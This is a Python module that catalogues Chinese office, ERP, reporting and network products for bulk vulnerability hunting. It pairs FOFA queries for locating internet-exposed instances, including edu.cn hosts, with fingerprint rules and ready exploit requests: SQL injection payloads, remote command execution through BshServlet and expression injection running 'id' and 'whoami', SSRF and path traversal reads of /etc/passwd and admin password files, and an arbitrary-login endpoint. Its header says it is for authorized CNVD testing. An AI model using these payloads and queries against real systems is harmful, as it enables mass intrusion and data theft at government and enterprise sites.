#!/usr/bin/env python3
"""
CNVD Targets — 国产系统指纹库 + FOFA 语法 + POC 数据库
用于 CNVD 通用型漏洞批量挖掘

本模块提供：
1. 国产 OA/ERP/BI/HR 系统的 FOFA 搜索语法
2. 各系统已知漏洞接口的 POC（用于验证是否存在未修复实例）
3. 指纹识别规则
4. 漏洞严重性评估

⚠️ 仅用于已授权的安全测试和 CNVD/补天/SRC 漏洞提交
"""

from dataclasses import dataclass, field
from typing import List, Dict, Optional


# ═══════════════════════════════════════════════════════════════
# 数据结构
# ═══════════════════════════════════════════════════════════════

@dataclass
class TargetSystem:
    """目标系统定义"""
    name: str = ""                     # 系统名称
    vendor: str = ""                   # 厂商
    fofa_queries: List[str] = field(default_factory=list)  # FOFA 搜索语法
    fingerprints: List[Dict] = field(default_factory=list)  # 指纹规则
    pocs: List[Dict] = field(default_factory=list)          # POC 列表
    cnvd_value: str = "high"           # CNVD 收录价值: high/medium/low
    description: str = ""


@dataclass
class POC:
    """漏洞 POC"""
    name: str = ""
    vuln_type: str = ""                # sqli/rce/upload/unauth/ssrf/deserialize/lfi
    severity: str = "high"             # critical/high/medium/low
    method: str = "GET"
    path: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    content_type: str = ""
    # 验证
    match_status: List[int] = field(default_factory=list)   # 期望状态码
    match_body: List[str] = field(default_factory=list)     # 响应体匹配关键字
    not_match_body: List[str] = field(default_factory=list) # 响应体不应包含
    # 元数据
    cve_id: str = ""
    xve_id: str = ""                   # 奇安信 XVE 编号
    reference: str = ""
    affected_versions: List[str] = field(default_factory=list)
    description: str = ""


# ═══════════════════════════════════════════════════════════════
# 第一梯队：国产 OA 系统
# ═══════════════════════════════════════════════════════════════

FANWEI_ECOLOGY = TargetSystem(
    name="泛微 e-cology",
    vendor="泛微",
    fofa_queries=[
        'app="泛微-协同办公OA"',
        'app="泛微-协同商务系统"',
        'body="ecology_JQ" && country="CN"',
        'body="/wui/theme/" && country="CN"',
        '(app="泛微-协同办公OA" || app="泛微-EOffice") && country="CN"',
    ],
    fingerprints=[
        {"type": "body", "pattern": "ecology_JQ"},
        {"type": "body", "pattern": "/wui/theme/"},
        {"type": "body", "pattern": "weaver"},
        {"type": "header", "key": "Server", "pattern": "Resin"},
    ],
    pocs=[
        {
            "name": "泛微e-cology WorkflowServiceXml SQL注入",
            "vuln_type": "sqli",
            "severity": "critical",
            "method": "POST",
            "path": "/services/WorkflowServiceXml",
            "content_type": "text/xml",
            "body": '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workflow.weaver"><soapenv:Body><web:doCreateWorkflowRequest><web:string><![CDATA[<xml><WorkflowRequestInfo><requestName>1\' AND 1=CONVERT(INT,@@version)--</requestName></WorkflowRequestInfo></xml>]]></web:string></web:doCreateWorkflowRequest></soapenv:Body></soapenv:Envelope>',
            "match_status": [500],
            "match_body": ["Microsoft SQL Server", "Conversion failed"],
            "description": "泛微OA WorkflowServiceXml 接口 SQL注入",
        },
        {
            "name": "泛微e-cology WorkPlanService SQL注入 (XVE-2024-18112)",
            "vuln_type": "sqli",
            "severity": "critical",
            "method": "POST",
            "path": "/services/WorkPlanService",
            "content_type": "text/xml",
            "body": '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><getWorkPlanList><condition>1) AND 1=1--</condition></getWorkPlanList></soapenv:Body></soapenv:Envelope>',
            "match_status": [200, 500],
            "match_body": ["WorkPlanInfo", "result"],
            "xve_id": "XVE-2024-18112",
            "description": "泛微e-cology9 WorkPlanService前台SQL注入",
        },
        {
            "name": "泛微e-cology browser.jsp SQL注入",
            "vuln_type": "sqli",
            "severity": "high",
            "method": "GET",
            "path": "/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333",
            "match_status": [200],
            "match_body": ["id", "text"],
            "not_match_body": ["error", "login"],
            "description": "泛微OA browser.jsp 前台SQL注入",
        },
        {
            "name": "泛微e-office schema_mysql.sql 信息泄露",
            "vuln_type": "unauth",
            "severity": "medium",
            "method": "GET",
            "path": "/mysql/schema_mysql.sql",
            "match_status": [200],
            "match_body": ["CREATE TABLE", "INSERT INTO"],
            "description": "泛微e-office 数据库schema文件泄露",
        },
    ],
    cnvd_value="high",
    description="泛微OA 国内市占率高，漏洞影响范围广，CNVD 高收录率",
)


YONGYOU_NC = TargetSystem(
    name="用友 NC / NC Cloud",
    vendor="用友",
    fofa_queries=[
        'app="用友-NC-Cloud"',
        'app="用友-NC"',
        'body="nccloud" && country="CN"',
        'body="yonyou" && title="NC" && country="CN"',
        'body="/platform/login" && body="用友" && country="CN"',
    ],
    fingerprints=[
        {"type": "body", "pattern": "nccloud"},
        {"type": "body", "pattern": "yonyou"},
        {"type": "body", "pattern": "/platform/login"},
        {"type": "header", "key": "Set-Cookie", "pattern": "JSESSIONID"},
    ],
    pocs=[
        {
            "name": "用友NC runStateServlet SQL注入",
            "vuln_type": "sqli",
            "severity": "critical",
            "method": "POST",
            "path": "/servlet/~ic/com.ufida.report.anareport.servlet.RunStateServlet",
            "content_type": "application/x-www-form-urlencoded",
            "body": "RunState=1&m_bMustPrint=Y&szSQL=select%20@@version",
            "match_status": [200],
            "match_body": ["Microsoft SQL Server", "version"],
            "description": "用友NC runStateServlet 接口SQL注入",
        },
        {
            "name": "用友NC Cloud upload RCE",
            "vuln_type": "rce",
            "severity": "critical",
            "method": "POST",
            "path": "/uapws/uploadServlet",
            "content_type": "multipart/form-data",
            "body": "",  # 需要动态构造 multipart
            "match_status": [200],
            "match_body": ["success", "filePath"],
            "description": "用友NC Cloud 前台文件上传RCE",
        },
        {
            "name": "用友NC UserAuthenticationServlet 反序列化",
            "vuln_type": "deserialize",
            "severity": "critical",
            "method": "POST",
            "path": "/servlet/~uapws/com.yonyou.itf.settlement.web.UserAuthenticationServlet",
            "content_type": "application/octet-stream",
            "match_status": [200, 500],
            "match_body": [],
            "xve_id": "XVE-2024-18302",
            "description": "用友NC UserAuthenticationServlet 反序列化RCE",
        },
        {
            "name": "用友NC bsh.servlet.BshServlet 命令执行",
            "vuln_type": "rce",
            "severity": "critical",
            "method": "POST",
            "path": "/servlet/~ic/bsh.servlet.BshServlet",
            "content_type": "application/x-www-form-urlencoded",
            "body": 'bsh.script=print("cnvd_test_"+java.lang.Runtime.getRuntime().exec("id").toString());',
            "match_status": [200],
            "match_body": ["cnvd_test_"],
            "description": "用友NC BshServlet 远程代码执行",
        },
    ],
    cnvd_value="high",
    description="用友NC 政企客户众多，RCE/反序列化漏洞 CNVD 必收",
)


ZHIYUAN_OA = TargetSystem(
    name="致远 OA",
    vendor="致远互联",
    fofa_queries=[
        'app="致远互联-OA"',
        'body="seeyon" && country="CN"',
        'body="/seeyon/main.do" && country="CN"',
        '(body="A8" || body="A6") && body="seeyon" && country="CN"',
    ],
    fingerprints=[
        {"type": "body", "pattern": "seeyon"},
        {"type": "body", "pattern": "/seeyon/"},
        {"type": "url", "pattern": "/seeyon/main.do"},
    ],
    pocs=[
        {
            "name": "致远OA fileUpload.do 文件上传",
            "vuln_type": "upload",
            "severity": "critical",
            "method": "POST",
            "path": "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip",
            "content_type": "application/x-www-form-urlencoded",
            "body": "managerMethod=validate&arguments=%24%7B%22%22.getClass().forName(%22java.lang.Runtime%22).getMethod(%22exec%22%2C%22%22.getClass()).invoke(%22%22.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22).invoke(null)%2C%22whoami%22)%7D",
            "match_status": [200],
            "match_body": [],
            "description": "致远OA 前台文件上传绕过",
        },
        {
            "name": "致远OA htmlofficeservlet RCE",
            "vuln_type": "rce",
            "severity": "critical",
            "method": "POST",
            "path": "/seeyon/htmlofficeservlet",
            "content_type": "application/octet-stream",
            "match_status": [200],
            "match_body": [],
            "description": "致远OA htmlofficeservlet 远程代码执行",
        },
        {
            "name": "致远OA V5 properties信息泄露",
            "vuln_type": "unauth",
            "severity": "medium",
            "method": "GET",
            "path": "/seeyon/management/status.jsp",
            "match_status": [200],
            "match_body": ["appName", "version", "server"],
            "not_match_body": ["login", "error"],
            "description": "致远OA 系统配置信息泄露",
        },
    ],
    cnvd_value="high",
    description="致远OA 政务领域广泛使用，RCE 漏洞 CNVD 高价值",
)


TONGDA_OA = TargetSystem(
    name="通达 OA",
    vendor="通达信科",
    fofa_queries=[
        'app="通达OA"',
        'body="TONGDA" && body="OA" && country="CN"',
        'body="/ispirit/" && country="CN"',
    ],
    fingerprints=[
        {"type": "body", "pattern": "TONGDA"},
        {"type": "body", "pattern": "/ispirit/"},
        {"type": "body", "pattern": "通达"},
    ],
    pocs=[
        {
            "name": "通达OA 任意用户登录",
            "vuln_type": "unauth",
            "severity": "critical",
            "method": "GET",
            "path": "/mobile/auth_mo498y.php",
            "match_status": [200],
            "match_body": ["PHPSESSID", "true"],
            "not_match_body": ["error", "failed"],
            "description": "通达OA 前台任意用户登录伪造",
        },
        {
            "name": "通达OA 文件上传+文件包含 RCE",
            "vuln_type": "upload",
            "severity": "critical",
            "method": "POST",
            "path": "/ispirit/im/upload.php",
            "content_type": "multipart/form-data",
            "match_status": [200],
            "match_body": ["filepath"],
            "description": "通达OA 文件上传结合文件包含实现RCE",
        },
    ],
    cnvd_value="high",
    description="通达OA 中小企业使用量大，实例多容易批量验证",
)


# ═══════════════════════════════════════════════════════════════
# 第二梯队：报表/BI 系统
# ═══════════════════════════════════════════════════════════════

FANRUAN_FINEREPORT = TargetSystem(
    name="帆软 FineReport",
    vendor="帆软",
    fofa_queries=[
        'app="帆软-FineReport"',
        'body="FineReport" && country="CN"',
        'body="/WebReport/ReportServer" && country="CN"',
        'body="decision" && body="fine" && country="CN"',
    ],
    fingerprints=[
        {"type": "body", "pattern": "FineReport"},
        {"type": "body", "pattern": "ReportServer"},
        {"type": "body", "pattern": "/WebReport/"},
        {"type": "url", "pattern": "/decision/"},
    ],
    pocs=[
        {
            "name": "帆软FineReport ReportServer SQL注入→RCE",
            "vuln_type": "sqli",
            "severity": "critical",
            "method": "GET",
            "path": "/webroot/decision/view/ReportServer?n=1%27%20union%20select%201,2,3,4,5,6,7,8,9,10--",
            "match_status": [200],
            "match_body": [],
            "not_match_body": ["error", "404"],
            "description": "帆软 ReportServer 参数n SQL注入（sqlite-jdbc利用可RCE）",
        },
        {
            "name": "帆软FineReport 目录遍历",
            "vuln_type": "lfi",
            "severity": "high",
            "method": "GET",
            "path": "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
            "match_status": [200],
            "match_body": ["<PrivilegeManager", "password"],
            "description": "帆软 FineReport 任意文件读取泄露管理员密码",
        },
        {
            "name": "帆软FineReport 未授权访问",
            "vuln_type": "unauth",
            "severity": "medium",
            "method": "GET",
            "path": "/WebReport/ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin",
            "match_status": [200],
            "match_body": ["log", "info"],
            "not_match_body": ["login", "unauthorized"],
            "description": "帆软 FineReport 日志信息未授权访问",
        },
    ],
    cnvd_value="high",
    description="帆软报表企业部署量极大，SQL注入→RCE 漏洞 CNVD 高价值",
)


# ═══════════════════════════════════════════════════════════════
# 第三梯队：HR/ERP/其他
# ═══════════════════════════════════════════════════════════════

HONGJING_EHR = TargetSystem(
    name="宏景 eHR",
    vendor="宏景科技",
    fofa_queries=[
        'body="eHR" && body="宏景" && country="CN"',
        'body="HCM" && body="宏景" && country="CN"',
        'title="宏景" && country="CN"',
    ],
    fingerprints=[
        {"type": "body", "pattern": "宏景"},
        {"type": "body", "pattern": "eHR"},
        {"type": "title", "pattern": "宏景"},
    ],
    pocs=[
        {
            "name": "宏景eHR downlawbase SQL注入",
            "vuln_type": "sqli",
            "severity": "critical",
            "method": "GET",
            "path": "/w_self498/oawork/fckeditor/editor/filemanager/connectors/jsp/connector?Command=test&Type=test&CurrentFolder=/test%27%20union%20select%201,2,3,4--",
            "match_status": [200],
            "match_body": [],
            "description": "宏景eHR downlawbase接口 SQL注入",
        },
    ],
    cnvd_value="medium",
    description="宏景eHR 政府/事业单位部署，SQL注入漏洞",
)


WANHU_OA = TargetSystem(
    name="万户 OA (ezOFFICE)",
    vendor="万户网络",
    fofa_queries=[
        'app="万户网络-ezOFFICE"',
        'body="ezoffice" && country="CN"',
        'body="万户" && body="OA" && country="CN"',
    ],
    fingerprints=[
        {"type": "body", "pattern": "ezoffice"},
        {"type": "body", "pattern": "万户"},
    ],
    pocs=[
        {
            "name": "万户OA DocumentEdit SQL注入",
            "vuln_type": "sqli",
            "severity": "high",
            "method": "GET",
            "path": "/defaultroot/platform/bpm/work_flow/DocumentEdit.jsp?RecordID=1%27%20AND%201=CONVERT(INT,@@version)--",
            "match_status": [200, 500],
            "match_body": ["Microsoft SQL Server"],
            "description": "万户OA DocumentEdit接口 SQL注入",
        },
    ],
    cnvd_value="medium",
    description="万户OA 中型企业使用",
)


LANLING_EKP = TargetSystem(
    name="蓝凌 OA (EKP)",
    vendor="蓝凌",
    fofa_queries=[
        'app="蓝凌-EKP"',
        'body="landray" && country="CN"',
        'body="蓝凌" && body="OA" && country="CN"',
        'body="/sys/ui/" && body="landray" && country="CN"',
    ],
    fingerprints=[
        {"type": "body", "pattern": "landray"},
        {"type": "body", "pattern": "蓝凌"},
        {"type": "body", "pattern": "/sys/ui/"},
    ],
    pocs=[
        {
            "name": "蓝凌OA SSRF + 任意文件读取",
            "vuln_type": "ssrf",
            "severity": "high",
            "method": "POST",
            "path": "/sys/ui/extend/varkind/custom.jsp",
            "content_type": "application/x-www-form-urlencoded",
            "body": "var={\"body\":{\"file\":\"file:///etc/passwd\"}}",
            "match_status": [200],
            "match_body": ["root:", "/bin/"],
            "description": "蓝凌OA SSRF导致任意文件读取",
        },
        {
            "name": "蓝凌OA 反序列化",
            "vuln_type": "deserialize",
            "severity": "critical",
            "method": "POST",
            "path": "/sys/search/sys_search_main/sysSearchMain.do?method=editParam",
            "content_type": "application/x-www-form-urlencoded",
            "match_status": [200, 500],
            "match_body": [],
            "description": "蓝凌OA 反序列化漏洞",
        },
    ],
    cnvd_value="high",
    description="蓝凌OA 大型企业使用，SSRF/反序列化 CNVD 收录率高",
)


RUIJIE_NETWORK = TargetSystem(
    name="锐捷网络设备",
    vendor="锐捷网络",
    fofa_queries=[
        'app="Ruijie-RG" && country="CN"',
        'body="锐捷" && country="CN"',
        'title="RG-" && body="login" && country="CN"',
        'app="锐捷-NBR路由器" && country="CN"',
    ],
    fingerprints=[
        {"type": "body", "pattern": "锐捷"},
        {"type": "body", "pattern": "Ruijie"},
        {"type": "title", "pattern": "RG-"},
    ],
    pocs=[
        {
            "name": "锐捷NBR路由器 命令执行",
            "vuln_type": "rce",
            "severity": "critical",
            "method": "POST",
            "path": "/WEB_VMS/LEVEL15/",
            "content_type": "application/x-www-form-urlencoded",
            "body": "command=show version&strurl=exec%04&mode=%02PRIV_EXEC&signession=1",
            "match_status": [200],
            "match_body": ["Version", "Hardware"],
            "description": "锐捷网络设备命令执行",
        },
    ],
    cnvd_value="high",
    description="锐捷网络设备量大面广，通用漏洞影响范围大",
)


BAOTA_PANEL = TargetSystem(
    name="宝塔面板",
    vendor="宝塔",
    fofa_queries=[
        'app="宝塔-Linux面板"',
        'title="宝塔Linux面板" && country="CN"',
        'body="宝塔" && port="8888" && country="CN"',
    ],
    fingerprints=[
        {"type": "body", "pattern": "宝塔"},
        {"type": "title", "pattern": "宝塔"},
        {"type": "port", "value": 8888},
    ],
    pocs=[
        {
            "name": "宝塔面板 未授权访问",
            "vuln_type": "unauth",
            "severity": "critical",
            "method": "GET",
            "path": "/plugin?action=a&name=files&s=get_file_body&path=/etc/passwd",
            "match_status": [200],
            "match_body": ["root:"],
            "description": "宝塔面板特定版本未授权访问+任意文件读取",
        },
    ],
    cnvd_value="high",
    description="宝塔面板国内服务器装机量极大",
)


# ═══════════════════════════════════════════════════════════════
# 目标系统注册表
# ═══════════════════════════════════════════════════════════════

# 所有目标系统（按 CNVD 价值排序）
ALL_TARGETS: List[TargetSystem] = [
    # 第一梯队
    FANWEI_ECOLOGY,
    YONGYOU_NC,
    ZHIYUAN_OA,
    TONGDA_OA,
    # 第二梯队
    FANRUAN_FINEREPORT,
    LANLING_EKP,
    # 第三梯队
    HONGJING_EHR,
    WANHU_OA,
    RUIJIE_NETWORK,
    BAOTA_PANEL,
]

# 按厂商分组
TARGETS_BY_VENDOR: Dict[str, List[TargetSystem]] = {}
for t in ALL_TARGETS:
    TARGETS_BY_VENDOR.setdefault(t.vendor, []).append(t)

# 按漏洞类型分组的 FOFA 快捷查询
FOFA_QUICK_QUERIES = {
    "rce": [
        'app="用友-NC-Cloud" && country="CN"',
        'app="致远互联-OA" && country="CN"',
        'app="蓝凌-EKP" && country="CN"',
        'app="锐捷-NBR路由器" && country="CN"',
    ],
    "sqli": [
        'app="泛微-协同办公OA" && country="CN"',
        'app="帆软-FineReport" && country="CN"',
        'app="用友-NC" && country="CN"',
        'body="eHR" && body="宏景" && country="CN"',
        'app="万户网络-ezOFFICE" && country="CN"',
    ],
    "upload": [
        'app="通达OA" && country="CN"',
        'app="致远互联-OA" && country="CN"',
    ],
    "unauth": [
        'app="宝塔-Linux面板"',
        'app="通达OA" && country="CN"',
        'app="帆软-FineReport" && country="CN"',
    ],
}

# 教育网专用查询（EDUSRC 用）
FOFA_EDU_QUERIES = {
    "grafana": 'cert="edu.cn" && title="Grafana"',
    "nacos": 'cert="edu.cn" && body="nacos"',
    "spring_actuator": 'cert="edu.cn" && body="actuator"',
    "druid": 'cert="edu.cn" && body="Druid Stat"',
    "swagger": 'cert="edu.cn" && (body="swagger" || body="api-docs")',
    "jenkins": 'cert="edu.cn" && title="Jenkins"',
    "kibana": 'cert="edu.cn" && title="Kibana"',
    "minio": 'cert="edu.cn" && title="MinIO"',
    "finereport": 'cert="edu.cn" && body="FineReport"',
    "yongyou": 'cert="edu.cn" && body="用友"',
}


def get_targets_by_priority(priority: str = "high") -> List[TargetSystem]:
    """按优先级获取目标列表"""
    return [t for t in ALL_TARGETS if t.cnvd_value == priority]


def get_all_fofa_queries() -> List[str]:
    """获取所有 FOFA 查询语法"""
    queries = []
    for t in ALL_TARGETS:
        queries.extend(t.fofa_queries)
    return queries


def get_pocs_by_type(vuln_type: str) -> List[Dict]:
    """按漏洞类型获取所有 POC"""
    pocs = []
    for t in ALL_TARGETS:
        for poc in t.pocs:
            if poc.get("vuln_type") == vuln_type:
                pocs.append({"system": t.name, **poc})
    return pocs


def get_system_by_name(name: str) -> Optional[TargetSystem]:
    """按名称获取目标系统"""
    for t in ALL_TARGETS:
        if name.lower() in t.name.lower() or name.lower() in t.vendor.lower():
            return t
    return None
